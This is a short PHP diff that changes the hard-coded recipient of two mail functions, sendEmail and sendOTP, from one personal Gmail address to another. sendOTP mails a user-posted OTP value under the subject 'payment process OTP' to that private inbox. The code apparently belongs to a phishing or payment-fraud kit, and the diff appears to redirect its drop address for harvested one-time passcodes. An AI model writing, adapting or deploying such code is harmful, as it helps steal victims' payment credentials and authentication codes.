@@ -63,7 +63,7 @@ function sendEmail($post) {
     // } catch (Exception $e) {
     //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     // }
-    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
+    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
     // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
     // $message = filter_var($message, FILTER_SANITIZE_STRING);
     // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
@@ -164,7 +164,7 @@ function sendContact($post) {
     }
 }
 function sendOTP($post) {
-    $to = filter_var("habeebajani9@gmail.com", FILTER_SANITIZE_EMAIL);
+    $to = filter_var("americanresidence435@gmail.com", FILTER_SANITIZE_EMAIL);
     $subject = filter_var("payment process OTP", FILTER_SANITIZE_STRING);
     $otp = $post['OTP'];
     
